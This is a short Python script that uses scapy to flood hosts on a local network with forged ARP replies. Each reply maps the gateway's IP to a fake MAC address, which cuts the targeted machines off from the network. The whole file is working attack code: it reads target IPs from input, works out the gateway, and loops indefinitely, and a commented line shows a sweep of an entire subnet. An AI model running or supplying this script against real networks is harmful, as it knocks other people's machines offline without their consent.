#!/usr/bin/env python
# author:  Hua Liang [ Stupid ET ]
# email:   et@everet.org
# website: http://EverET.org
#

import sys
from scapy.all import ARP, send


def kill(targets, gateway_ip="192.168.1.1", nloop=True):
    if targets is not list:
        targets = [targets]
    a = ARP()
    a.psrc = gateway_ip
    a.hwsrc = "2b:2b:2b:2b:2b:2b"
    a.hwdst = "ff:ff:ff:ff:ff:ff"

    while True:
        for target in targets:
            a.pdst = target
            send(a)
        if not nloop:
            break

if __name__ == '__main__':

    # targets = ['125.216.227.' + str(ip) for ip in range(255) if ip != 11]

    targets = sys.stdin.read().splitlines()

    print "targets", targets
    is_gateway = lambda ip: ip[ip.rfind('.') + 1:] == '254'
    gateway = filter(is_gateway, targets)
    targets = filter(lambda x: not is_gateway(x), targets)
    targets = filter(lambda x: len(x) != 0, targets)

    if not gateway:
        gateway = targets[0][:targets[0].rfind('.') + 1] + "254"

    print gateway
    print targets

    kill(targets, gateway)
